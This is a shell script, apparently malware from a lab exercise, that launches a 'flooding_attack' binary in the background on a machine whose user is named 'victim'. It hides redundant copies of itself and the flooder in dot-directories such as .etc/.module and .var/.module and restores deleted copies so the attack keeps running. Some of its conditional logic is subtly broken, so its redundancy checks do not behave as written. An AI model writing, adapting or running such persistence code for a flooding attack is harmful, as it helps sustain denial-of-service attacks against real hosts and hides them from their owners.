#!/bin/sh

is_process_exist() {
  local process_name="flooding_attack"
  ps -e | grep -q "$process_name"
}

check_process() {
  is_process_exist
  if [ $? -eq 0 ]; then # positive match
  echo "Attack already launched!"
  pkill -f /home/victim/.etc/.module/flooding_attack
  pkill -f /home/victim/.var/.module/flooding_attack
  fi
}

check_launching_file() {
  # restore corrupted launching file
  if [ -f "$home_dir/$launch_dir1/$launch_file" ] ||\
    [ ! -f "$home_dir/$launch_dir2/$launch_file" ]
  then
    cp -r "$home_dir/$launch_dir1" "$home_dir/$launch_dir2"
  elif [ -f "$home_dir/$launch_dir2/$launch_file" ] ||\
    [ ! -f "$home_dir/$launch_dir1/$launch_file" ]
  then
    cp -r "$home_dir/$launch_dir2" "$home_dir/$launch_dir1"
  fi
}

launch_attack() {
  # launching attack and restore corrupted flooding attack files
  check_process
  echo "Launching Flooding Attack..."
  if [ -f "$home_dir/$dir01/$module_dir/$flooding_file" ] ||\
    [ ! -f "$home_dir/$dir02/$module_dir/$flooding_file" ]
  then
    $home_dir/$dir01/$module_dir/flooding_attack&
    cp -r "$home_dir/$dir01" "$home_dir/$dir02"
  elif [ -f "$home_dir/$dir02/$module_dir/$flooding_file" ] ||\
    [ ! -f "$home_dir/$dir01/$module_dir/$flooding_file" ]
  then
    $home_dir/$dir02/$module_dir/flooding_attack&
    cp -r "$home_dir/$dir02" "$home_dir/$dir01"
  fi
  echo "Flooding Attack running Background!"
}

payload() {
  check_launching_file
  launch_attack
}

main() {
  local home_dir="/home/victim"
  local launch_dir1=".Launch_Attack"
  local launch_dir2=".Attack_Launch"
  local dir01=".etc"
  local dir02=".var"
  local module_dir=".module"
  local launch_file="launching_attack.sh"
  local flooding_file="flooding_attack"
  payload
}
main
